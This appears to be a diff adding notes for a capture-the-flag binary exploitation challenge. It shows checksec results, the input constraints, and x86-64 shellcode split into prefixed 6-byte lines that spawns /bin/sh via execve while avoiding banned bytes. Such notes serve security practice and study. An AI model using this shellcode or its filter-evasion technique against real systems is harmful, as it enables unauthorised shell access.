@@ -1,0 +1,38 @@
+linux-vdso.so.1 (0x00007fff34fd3000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f36dd315000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f36dd51b000)
+
+Stack:    No canary found
+NX:       NX disabled
+PIE:      No PIE (0x400000)
+RWX:      Has RWX segments
+
+
+
+
+buffer has 240 bytes
+read 96 bytes into buffer
+first 96 bytes cannot have 0x90, 0x6b, 0x69, 0x72, 0x74, 0x6f
+96/6=16 lines
+divide the shellcode into lines of 6
+each line must start with 0xc 0x87 0x63
+after the 112 byte, the shellcode will be executed
+
+ 1 \x0c\x87\x63\x3c\x87\x53 #53
+ 2 \x0c\x87\x63\x31\xc0\x63 #31 c0
+ 3 \x0c\x87\x63\x3c\x0c\x63 #3c 0c 
+ 4 \x0c\x87\x63\x48\xbb\xd1 #48 bb d1 
+ 5 \x0c\x87\x63\x9d\x96\x91 #9d 96 91
+ 6 \x0c\x87\x63\xd0\x8c\x97 #d0 8c 97
+ 7 \x0c\x87\x63\x3c\x87\xff #ff
+ 8 \x0c\x87\x63\x48\xf7\xdb #48 f7 db 
+ 9 \x0c\x87\x63\x53\x54\x5f #53 54 5f 
+10 \x0c\x87\x63\x99\x52\x57 #99 52 57
+11 \x0c\x87\x63\x54\x5e\x63 #54 5e 
+12 \x0c\x87\x63\xb0\x3b\x63 #b0 3b
+13 \x0c\x87\x63\x3c\x0c\x63 #3c 0c
+14 \x0c\x87\x63\x0f\x05\x63 #0f 05 
+15 \x0c\x87\x63\x3c\x0c\x63 #3c 0c
+16 \x0c\x87\x63\x3c\x87\x63 
+17 \x0c\x87\x63\x3c\x87\x63 
+18 \x0c\x87\x63\x3c\x87\x63
